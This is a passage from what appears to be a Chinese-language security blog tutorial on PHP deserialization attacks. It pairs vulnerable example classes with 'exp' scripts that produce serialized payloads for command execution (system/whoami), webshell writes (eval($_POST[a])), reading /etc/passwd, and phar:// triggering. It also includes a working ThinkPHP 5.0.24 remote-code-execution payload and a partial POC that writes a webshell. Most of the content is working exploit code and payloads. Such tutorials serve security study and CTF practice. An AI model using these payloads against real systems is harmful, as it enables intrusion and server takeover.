&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_POST[<span class="string">'pop'</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd = <span class="string">'ls'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="keyword">new</span> flag();</span><br><span class="line">$flag-&gt;cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br></pre></td></tr></table></figure><p>生成的序列化文本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"cmd"</span>;s:<span class="number">6</span>:<span class="string">"whoami"</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过对象被反序列化后调用wake up魔术方法，触发system命令执行</p></blockquote><h4 id="Magicmethods-wakeup-实例2"><a href="#Magicmethods-wakeup-实例2" class="headerlink" title="Magicmethods-__wakeup 实例2"></a>Magicmethods-__wakeup 实例2</h4><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'1.txt'</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">'hello'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_POST[<span class="string">'pop'</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'1.txt'</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">'hello'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> flag(); <span class="comment">//生成对象赋值到变量里面</span></span><br><span class="line">$flag-&gt;filename = <span class="string">'1.php'</span>;</span><br><span class="line">$flag-&gt;content = <span class="string">'&lt;?php eval($_POST[a]); ?&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);<span class="comment">//序列号操作</span></span><br></pre></td></tr></table></figure><p>生成的序列化文本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;flag&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;s:7:&quot;content&quot;;s:25:&quot;&lt;?php eval($_POST[a]); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="Magicmethods-tostring"><a href="#Magicmethods-tostring" class="headerlink" title="Magicmethods-__tostring"></a>Magicmethods-__tostring</h4><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'1.txt'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename).<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"great!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag = unserialize($_POST[<span class="string">'pop'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'1.txt'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename).<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"great!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="keyword">new</span> flag();</span><br><span class="line">$flag-&gt;filename = <span class="string">'/etc/passwd'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br></pre></td></tr></table></figure><p>生成的序列化文本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">"filename"</span>;s:<span class="number">11</span>:<span class="string">"/etc/passwd"</span>;&#125;</span><br></pre></td></tr></table></figure><h4 id="其他成员action的调用链"><a href="#其他成员action的调用链" class="headerlink" title="其他成员action的调用链"></a>其他成员action的调用链</h4><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> flag2(); <span class="comment">//把obj属性赋值给flag2这个定义对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;action(); <span class="comment">//调用属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'flag2-&gt;action()'</span>; <span class="comment">//直接返回字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd); <span class="comment">//高危函数system的参数就是cmd的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_POST[<span class="string">'pop'</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> flag2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'flag2-&gt;action()'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="keyword">new</span> flag();</span><br><span class="line">$flag-&gt;obj = <span class="keyword">new</span> flag3(); <span class="comment">//把flag的类对象 传给flag3</span></span><br><span class="line">$flag-&gt;obj-&gt;cmd = <span class="string">"whoami"</span>; <span class="comment">//访问flag3的类对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br></pre></td></tr></table></figure><blockquote><p><strong>这里只有flag有魔术方法，而有高危函数的flag3只有action不能调用，所以需要把flag的类对象传给flag3，这样魔术方法不需要主动调用，从而命令执行</strong></p></blockquote><p>生成的序列化文本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;flag&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;flag3&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="调用点-phar-触发命令执行"><a href="#调用点-phar-触发命令执行" class="headerlink" title="调用点- phar:// 触发命令执行"></a>调用点- phar:// 触发命令执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"DASCTF"</span>.<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;b); <span class="comment">//类的对象被当成字符串处理时就会被调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    @mkdir(<span class="string">"/tmp/upload"</span>);</span><br><span class="line">    $uuid = uniqid();</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $ext = end($ext);</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"/tmp/upload/"</span>.$uuid.<span class="string">"."</span>.$ext); <span class="comment">//把临时上传文件传到/tmp/upload下</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload Success! FilePath: /tmp/upload/"</span>.$uuid.<span class="string">"."</span>.$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr($_GET[<span class="string">'file'</span>], <span class="string">"flag"</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Get out!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>先想办法序列化中a的对象，然后让其反序列化<br>exp:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"DASCTF"</span>.<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">"&lt;?php __HALT_COMPILER();?&gt;"</span>); <span class="comment">// 标志着需要PHP反序列化</span></span><br><span class="line">$b = <span class="keyword">new</span> B(<span class="string">'system($_GET[a]);'</span>);</span><br><span class="line">$o = <span class="keyword">new</span> A($b);</span><br><span class="line">$phar -&gt; setMetadata($o);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p>运行后会生成了phar.phar</p><p><img src="http://qiniuyun.lintstar.top/20200806145918.png" alt="20200806145918"></p><p>上传phar后用伪协议生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8891/S10.php?file=phar:///tmp/upload/5f2ba8ae709a9.phar/test.txt</span><br></pre></td></tr></table></figure><p>反序列化了a对象，并且把a的值变成了DASCTF</p><p>接下来就要用反序列化a来调用对象b中的魔术方法，从而调用对象b中的高危函数eval</p><p>上传phar后生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8891/S10.php?file=phar:///tmp/upload/5f2baa1fe102c.phar/test.txt&amp;a=whoami</span><br></pre></td></tr></table></figure><blockquote><p><strong>反序列化攻击一定要想清楚调用链</strong></p></blockquote><h3 id="ThinkPHP-V5-0-24反序列化漏洞"><a href="#ThinkPHP-V5-0-24反序列化漏洞" class="headerlink" title="ThinkPHP V5.0.24反序列化漏洞"></a><strong>ThinkPHP V5.0.24反序列化漏洞</strong></h3><p>代码包：<a href="https://wws.lanzous.com/ij0LMfcld0b" target="_blank" rel="noopener">https://wws.lanzous.com/ij0LMfcld0b</a></p><p>ThinkPHP 5.0.24 反序列化RCE （Windows下EXP）<br>转载：<a href="https://www.cnblogs.com/xiaozhiru/p/12452528.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozhiru/p/12452528.html</a></p><p>运行POC后会生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.25.44:580/?a=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ==</span><br></pre></td></tr></table></figure><p>访问<code>http://10.20.25.44:580/8fba8bb6410a4aee90b063a8b7e78b73.php?a=system(&#39;cat /f*&#39;);</code>得到flag</p><p>另一个poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//File类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="comment">// tag变量跟文件名有关</span></span><br><span class="line">    <span class="keyword">protected</span> $tag=<span class="string">'abcdef'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $options = [</span><br><span class="line">        <span class="string">'expire'</span>        =&gt; <span class="number">3600</span>,</span><br><span class="line">        <span class="string">'cache_subdir'</span>  =&gt; <span class="keyword">false</span>,</span><br><span class="line">        <span class="string">'prefix'</span>        =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 写入文件</span></span><br><span class="line">        <span class="string">'path'</span>          =&gt; <span class="string">'php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=.//static/?&lt;hp pvela$(P_SO[T]x;)&gt;?/../'</span>,</span><br><span class="line">        <span class="comment">// 创建子目录</span></span><br><span class="line"><span class="comment">//        'path'       =&gt; './static/runtime/',</span></span><br><span class="line">        <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Memcached类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span 